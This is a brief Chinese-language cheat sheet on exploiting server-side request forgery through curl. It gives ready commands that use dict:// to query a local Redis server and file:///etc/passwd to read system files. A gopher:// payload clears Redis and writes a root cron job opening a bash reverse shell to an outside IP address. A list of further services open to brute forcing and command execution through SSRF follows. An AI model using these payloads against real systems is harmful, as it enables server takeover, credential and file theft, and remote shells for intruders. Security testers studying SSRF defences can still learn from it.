SSRF
================================

SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。

以curl为例

::

    # dict protocol (操作Redis) 

    curl -vvv 'dict://127.0.0.1:6379/info' # file protocol (任意文件读取) 

    curl -vvv 'file:///etc/passwd' # gopher protocol (一键反弹Bash) 

    # * 注意: 链接使用单引号，避免$变量问题

    curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a' 


其他可能的协议
--------------------------------
- ftp、ftps （FTP爆破） 
- tftp（UDP协议扩展） 
- imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码） 
- rtsp - smb/smbs （连接SMB） 
- telnet 
- 连接SSH/Telnet 
- http、https - 内网服务探测 
- 网络服务探测 
- ShellShock命令执行 
- JBOSS远程Invoker war命令执行 
- Java调试接口命令执行 
- axis2-admin部署Server命令执行 
- Jenkins Scripts接口命令执行 
- Confluence SSRF 
- Struts2一堆命令执行 
- counchdb WEB API远程命令执行 
- mongodb SSRF 
- docker API远程命令执行 
- php_fpm/fastcgi 命令执行 
- tomcat命令执行 
- Elasticsearch引擎Groovy脚本命令执行 
- WebDav PUT上传任意文件 
- WebSphere Admin可部署war间接命令执行 
- Apache Hadoop远程命令执行 
- zentoPMS远程命令执行 
- HFS远程命令执行 
- glassfish任意文件读取和war文件部署间接命令执行